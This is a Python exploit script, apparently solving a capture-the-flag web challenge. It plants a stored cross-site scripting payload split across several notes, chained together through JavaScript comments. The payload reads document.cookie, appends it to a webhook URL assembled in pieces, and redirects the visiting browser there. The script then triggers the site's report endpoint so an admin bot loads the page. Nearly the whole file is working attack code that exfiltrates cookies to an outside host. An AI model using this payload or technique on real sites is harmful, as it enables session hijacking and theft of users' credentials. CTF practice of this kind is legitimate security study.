import requests as r

url = input("Give link to chall website: ")

wh = input("Give link to webhook: ")

print(f"{url}/")
r1 = r.get(f"{url}/", data={}, headers = {})
uid = r1.url.split("/")[4]
cookie = "user=" + r1.url.split("/")[4]
print(cookie)

headers = {
    "Cookie" : cookie
}


data = {
    "note": "<img src='x' onerror='/*"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

data = {
    "note": "*/let a = \"\"; a +=/*"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

third_wh = wh[0:20]
second_third_wh = wh[20:40]
last_third_wh = wh[40:]

data = {
    "note": f"*/\"{third_wh}\";/*"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

data = {
    "note": f"*/a +=\"{second_third_wh}\";/*"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

data = {
    "note": f"*/a +=\"{last_third_wh}\";/*"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

data = {
    "note": "*/a += \"?a=\" + document.cookie;/*>"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

data = {
    "note": "*/window.location = a;'>"
}
resp = r.post(f"{url}/create/", data=data, headers=headers)

resp = r.get(f"{url}/report/{uid}")
